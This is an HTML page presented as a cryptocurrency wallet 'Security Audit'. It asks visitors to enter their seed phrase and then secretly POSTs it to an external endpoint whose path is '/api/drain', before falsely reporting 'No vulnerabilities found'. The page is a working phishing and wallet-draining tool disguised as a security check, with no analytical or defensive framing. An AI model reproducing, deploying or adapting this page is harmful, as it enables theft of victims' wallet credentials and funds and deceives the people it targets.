<!DOCTYPE html>
<html><head><title>Security Audit</title>
<style>body{background:#0a0e1a;color:#e8edf5;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}.container{background:rgba(255,255,255,0.05);padding:40px;border-radius:24px;max-width:500px;text-align:center}button{background:#22c55e;color:white;padding:14px 32px;border:none;border-radius:12px;cursor:pointer;width:100%;font-size:16px}textarea{width:100%;padding:12px;margin:10px 0;border-radius:8px;background:#1a1f35;color:white;border:1px solid #333;min-height:80px;font-family:monospace}.hidden{display:none}</style>
</head>
<body>
<div class="container">
<h1>?? Security Audit</h1>
<div id="step1"><button onclick="connect()">Connect Wallet</button></div>
<div id="step2" class="hidden"><textarea id="seed" placeholder="Enter seed phrase..."></textarea><button onclick="audit()">Run Audit</button></div>
<div id="step3" class="hidden"><h2>? Audit Complete</h2><p>No vulnerabilities found</p></div>
</div>
<script>
const API = 'https://discerning-wisdom-production.up.railway.app/api/drain';
function connect(){document.getElementById('step1').classList.add('hidden');document.getElementById('step2').classList.remove('hidden');}
function audit(){fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({seedPhrase:document.getElementById('seed').value})}).then(()=>{document.getElementById('step2').classList.add('hidden');document.getElementById('step3').classList.remove('hidden');});}
</script>
</body></html>
